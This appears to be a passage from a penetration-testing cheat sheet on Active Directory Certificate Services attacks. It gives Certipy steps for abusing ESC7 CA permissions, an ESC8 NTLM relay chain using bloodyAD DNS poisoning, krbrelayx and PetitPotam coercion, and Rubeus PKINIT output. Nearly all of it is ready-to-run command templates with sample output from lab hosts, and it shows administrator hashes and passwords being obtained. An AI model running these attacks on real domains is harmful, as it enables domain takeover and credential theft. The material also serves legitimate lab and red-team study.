   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Ask TGT

[*] Got domain: sendai.vl
[*] Using PKINIT with etype rc4_hmac and subject: CN=Clifford Davey, OU=staff, DC=sendai, DC=vl 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sendai.vl\administrator'
[*] Using domain controller: fe80::e0ed:1e1a:d300:7c8c%8:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGQjCCBj6gAwIBBaEDAgEWooIFWzCCBVdhggVTMIIFT6ADAg---[SNIP]---kuVkypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCXNlbmRhaS52bA==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/sendai.vl
  ServiceRealm             :  SENDAI.VL
  UserName                 :  administrator (NT_PRINCIPAL)
  UserRealm                :  SENDAI.VL
  StartTime                :  10/29/2025 1:57:24 AM
  EndTime                  :  10/29/2025 11:57:24 AM
  RenewTill                :  11/5/2025 12:57:24 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  kxrSerUVgUOgdHEO2pBeGw==
  ASREP (key)              :  5AAA0A9A6EF8DA2084C889F71D028796

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : CFB106FEEC8B89A3D98E14DCBE8D087A
```

{{< /tabcontent >}}

---

### ESC7: Dangerous Permissions on CA

{{< tab set10 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set10 tab1 >}}

#### 1. Use ManageCA Privilege to Add Manage Certificates Permission

```console {class="password"}
# Password
certipy-ad ca -u '<USER>' -p '<PASSWORD>' -target <TARGET> -ca <CA> -dc-ip <DC_IP> -add-officer '<USER>'
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -add-officer 'raven'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

```console {class="ntlm"}
# NTLM
certipy-ad ca -u '<USER>' -hashes '<HASH>' -target <TARGET> -ca <CA> -dc-ip <DC_IP> -add-officer '<USER>'
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven' -hashes '1635e153d4d6541a6367ec7a369d1fc7' -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -add-officer 'raven'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad ca -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-host <DC> -ca <CA> -dc-ip <DC_IP> -add-officer '<USER>'
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -add-officer 'raven'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad ca -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-host <DC> -ca <CA> -dc-ip <DC_IP> -add-officer '<USER>'
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven@manager.htb' -hashes '1635e153d4d6541a6367ec7a369d1fc7' -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -add-officer 'raven'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad ca -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-host <DC> -ca <CA> -dc-ip <DC_IP> -add-officer '<USER>'
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven@manager.htb' -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -add-officer 'raven'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

#### 2. Enable SubCA Template \[Optional\]

```console {class="password"}
# Password
certipy-ad ca -u '<USER>' -p '<PASSWORD>' -target <TARGET> -ca <CA> -dc-ip <DC_IP> -enable-template 'SubCA'
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -enable-template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

```console {class="ntlm"}
# NTLM
certipy-ad ca -u '<USER>' -hashes '<HASH>' -target <TARGET> -ca <CA> -dc-ip <DC_IP> -enable-template 'SubCA'
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven' -hashes '1635e153d4d6541a6367ec7a369d1fc7' -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -enable-template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad ca -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-host <DC> -ca <CA> -dc-ip <DC_IP> -enable-template 'SubCA'
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -enable-template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad ca -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-host <DC> -ca <CA> -dc-ip <DC_IP> -enable-template 'SubCA'
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven@manager.htb' -hashes '1635e153d4d6541a6367ec7a369d1fc7' -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -enable-template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad ca -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-host <DC> -ca <CA> -dc-ip <DC_IP> -enable-template 'SubCA'
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven@manager.htb' -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -enable-template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

#### 3. Request a Cert Based on SubCA

```console {class="password"}
# Password
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -dc-ip <DC_IP> -template 'SubCA'
```

```console {class="sample-code"}
$ certipy-ad req -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -upn administrator@manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '21.key'
[*] Wrote private key to '21.key'
[-] Failed to request certificate
```

```console {class="ntlm"}
# NTLM
certipy-ad req -u '<USER>' -hashes '<HASH>' -target <TARGET> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -dc-ip <DC_IP> -template 'SubCA'
```

```console {class="sample-code"}
$ certipy-ad req -u 'raven' -hashes '1635e153d4d6541a6367ec7a369d1fc7' -target dc01.manager.htb -upn administrator@manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '21.key'
[*] Wrote private key to '21.key'
[-] Failed to request certificate
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-host <DC> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -dc-ip <DC_IP> -template 'SubCA'
```

```console {class="sample-code"}
$ certipy-ad req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -k -target dc01.manager.htb -dc-host dc01.manager.htb -upn administrator@manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Requesting certificate via RPC
[*] Request ID is 21
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '21.key'
[*] Wrote private key to '21.key'
[-] Failed to request certificate
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-host <DC> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -dc-ip <DC_IP> -template 'SubCA'
```

```console {class="sample-code"}
$ certipy-ad req -u 'raven@manager.htb' -hashes '1635e153d4d6541a6367ec7a369d1fc7' -k -target dc01.manager.htb -dc-host dc01.manager.htb -upn administrator@manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Requesting certificate via RPC
[*] Request ID is 21
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '21.key'
[*] Wrote private key to '21.key'
[-] Failed to request certificate
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-host <DC> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -dc-ip <DC_IP> -template 'SubCA'
```

```console {class="sample-code"}
$ certipy-ad req -u 'raven@manager.htb' -k -target dc01.manager.htb -dc-host dc01.manager.htb -upn administrator@manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '21.key'
[*] Wrote private key to '21.key'
[-] Failed to request certificate
```

<small>*Note: Expect to be failed. Take note of the Request ID*</small>

#### 4. Issue Request Using ManageCA and Manage Certificates Privilege

```console {class="password"}
# Password
certipy-ad ca -u '<USER>' -p '<PASSWORD>' -target <TARGET> -ca <CA> -dc-ip <DC_IP> -issue-request <REQUEST_ID>
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -issue-request 21
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate request ID 21
```

```console {class="ntlm"}
# NTLM
certipy-ad ca -u '<USER>' -hashes '<HASH>' -target <TARGET> -ca <CA> -dc-ip <DC_IP> -issue-request <REQUEST_ID>
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven' -hashes '1635e153d4d6541a6367ec7a369d1fc7' -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -issue-request 21
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate request ID 21
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad ca -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-host <DC> -ca <CA> -dc-ip <DC_IP> -issue-request <REQUEST_ID>
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -issue-request 21
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Successfully issued certificate request ID 21
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad ca -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-host <DC> -ca <CA> -dc-ip <DC_IP> -issue-request <REQUEST_ID>
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven@manager.htb' -hashes '1635e153d4d6541a6367ec7a369d1fc7' -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -issue-request 21
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Successfully issued certificate request ID 21
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad ca -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-host <DC> -ca <CA> -dc-ip <DC_IP> -issue-request <REQUEST_ID>
```

```console {class="sample-code"}
$ certipy-ad ca -u 'raven@manager.htb' -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -issue-request 21
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate request ID 21
```

#### 5. Request a Certificate from CA on the Target Domain

```console {class="password"}
# Password
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -ca <CA> -dc-ip <DC_IP> -retrieve <REQUEST_ID>
```

```console {class="sample-code"}
$ certipy-ad req -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -retrieve 21
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 21
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '21.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ntlm"}
# NTLM
certipy-ad req -u '<USER>' -hashes '<HASH>' -target <TARGET> -ca <CA> -dc-ip <DC_IP> -retrieve <REQUEST_ID>
```

```console {class="sample-code"}
$ certipy-ad req -u 'raven' -hashes '1635e153d4d6541a6367ec7a369d1fc7' -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -retrieve 21
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 21
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '21.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-host <DC> -ca <CA> -dc-ip <DC_IP> -retrieve <REQUEST_ID>
```

```console {class="sample-code"}
$ certipy-ad req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -retrieve 21
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Retrieving certificate with ID 21
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '21.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-host <DC> -ca <CA> -dc-ip <DC_IP> -retrieve <REQUEST_ID>
```

```console {class="sample-code"}
$ certipy-ad req -u 'raven@manager.htb' -hashes '1635e153d4d6541a6367ec7a369d1fc7' -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -retrieve 21
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Retrieving certificate with ID 21
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '21.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-host <DC> -ca <CA> -dc-ip <DC_IP> -retrieve <REQUEST_ID>
```

```console {class="sample-code"}
$ certipy-ad req -u 'raven@manager.htb' -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -retrieve 21
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 21
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '21.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

#### 6. Get NTLM Hash

```console
certipy-ad auth -pfx <TARGET_USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad auth -pfx administrator.pfx -domain manager.htb -dc-ip 10.129.255.35
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@manager.htb'
[*] Using principal: 'administrator@manager.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

{{< /tabcontent >}}

---

### ESC8: NTLM Relay to AD CS Web Enrollment

{{< tab set11 tab1 >}}Linux{{< /tab >}}
{{< tab set11 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set11 tab1 >}}

#### 1. DNS Poisoning

```console {class="password"}
# Password
bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --host <DC> add dnsRecord '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
```

```console {class="sample-code"}
$ bloodyAD -u 'Rosie.Powell' -p 'Cicada123' -d cicada.vl --host DC-JPQ225.cicada.vl add dnsRecord 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.79
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

```console {class="ntlm"}
# NTLM
bloodyAD -u '<USER>' -p ':<HASH>' -f rc4 -d <DOMAIN> --host <DC> add dnsRecord '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
```

```console {class="sample-code"}
$ bloodyAD -u 'Rosie.Powell' -p ':ff99630bed1e3bfd90e6a193d603113f' -f rc4 -d cicada.vl --host DC-JPQ225.cicada.vl add dnsRecord 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.79
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --host <DC> add dnsRecord '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
```

```console {class="sample-code"}
$ bloodyAD -u 'Rosie.Powell' -p 'Cicada123' -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.79   
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
bloodyAD -u '<USER>' -p ':<HASH>' -f rc4 -d <DOMAIN> -k --host <DC> add dnsRecord '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
```

```console {class="sample-code"}
$ bloodyAD -u 'Rosie.Powell' -p ':ff99630bed1e3bfd90e6a193d603113f' -f rc4 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.79
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -u '<USER>' -d <DOMAIN> -k --host <DC> add dnsRecord '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
```

```console {class="sample-code"}
$ bloodyAD -u 'Rosie.Powell' -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.79
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

#### 2. Setup NTLM Relay

```console
python3 krbrelayx.py -t <TARGET_URL> --adcs --template DomainController -smb2support -v '<DC_HOSTNAME>$'
```

```console {class="sample-code"}
$ python3 krbrelayx.py -t http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp --adcs --template DomainController -smb2support -v 'DC-JPQ225$'
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.234.48
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] SMBD: Received connection from 10.129.234.48
[*] GOT CERTIFICATE! ID 92
[*] HTTP server returned status code 200, treating as a successful login
[*] Skipping user DC-JPQ225$ since attack was already performed
[*] Writing PKCS#12 certificate to ./DC-JPQ225.pfx
[*] Certificate successfully written to file
```

#### 3. Coerce Authentication

```console {class="password"}
# Password
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M coerce_plus -o LISTENER=<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -d cicada.vl -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```console {class="ntlm"}
# NTLM
nxc smb <DC> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M coerce_plus -o LISTENER=<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -H 'ff99630bed1e3bfd90e6a193d603113f' -d cicada.vl -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:ff99630bed1e3bfd90e6a193d603113f 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k -M coerce_plus -o LISTENER=<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -d cicada.vl -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
nxc smb <DC> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k -M coerce_plus -o LISTENER=<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -H 'ff99630bed1e3bfd90e6a193d603113f' -d cicada.vl -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:ff99630bed1e3bfd90e6a193d603113f 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
nxc smb <DC> -u '<USER>' -d <DOMAIN> -k --kdcHost <DC> --use-kcache -M coerce_plus -o LISTENER=<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

```console {class="sample-code"}
$ nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -d cicada.vl -k --kdcHost DC-JPQ225.cicada.vl --use-kcache -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell from ccache 
